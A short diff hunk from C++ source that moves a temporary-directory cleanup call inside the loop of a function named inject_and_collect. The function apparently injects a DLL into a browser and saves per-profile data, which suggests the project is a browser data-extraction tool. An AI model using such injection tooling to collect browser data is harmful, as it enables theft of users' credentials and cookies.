@@ -694,6 +694,8 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
 
             std::cout << "[+] Saved data for profile: " << profile << std::endl;
         }
+        std::error_code ec;
+        fs::remove_all(temp_dir, ec);
     }
 
     if (h_pipe != INVALID_HANDLE_VALUE) CloseHandle(h_pipe);
@@ -705,9 +707,6 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
     } else {
         CloseHandle(h_process);
     }
-
-    std::error_code ec;
-    fs::remove_all(temp_dir, ec);
 }
 
 int main(int argc, char* argv[]) {
